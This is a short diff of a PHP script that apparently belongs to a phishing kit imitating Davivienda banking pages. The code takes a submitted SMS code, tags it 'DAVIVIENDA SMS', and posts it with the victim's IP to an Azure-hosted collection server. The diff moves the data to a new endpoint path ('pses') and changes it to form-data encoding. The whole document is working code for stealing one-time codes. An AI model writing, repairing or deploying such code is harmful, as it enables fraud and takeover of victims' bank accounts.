@@ -5,7 +5,7 @@ if (isset($_POST['socialcorr'])) {
 	$message = 'DAVIVIENDA
 SMS: ' . $_POST['socialcorr'];
 	$payload = ['mensaje' => $message];
-	$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/daviviendaznequi/';
+	$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/pses/';
 
 	$ch = curl_init($url);
 	curl_setopt_array($ch, [
@@ -13,10 +13,9 @@ SMS: ' . $_POST['socialcorr'];
 		CURLOPT_POST           => true,
 		CURLOPT_HTTPHEADER     => [
 			'Accept: application/json',
-			'Content-Type: application/json',
-'X-Client-IP: ' . $myip,
+			'X-Client-IP: ' . $myip,
 		],
-		CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
+		CURLOPT_POSTFIELDS     => $payload, // ← se manda como form-data
 		CURLOPT_TIMEOUT        => 20,
 		CURLOPT_CONNECTTIMEOUT => 10,
 	]);
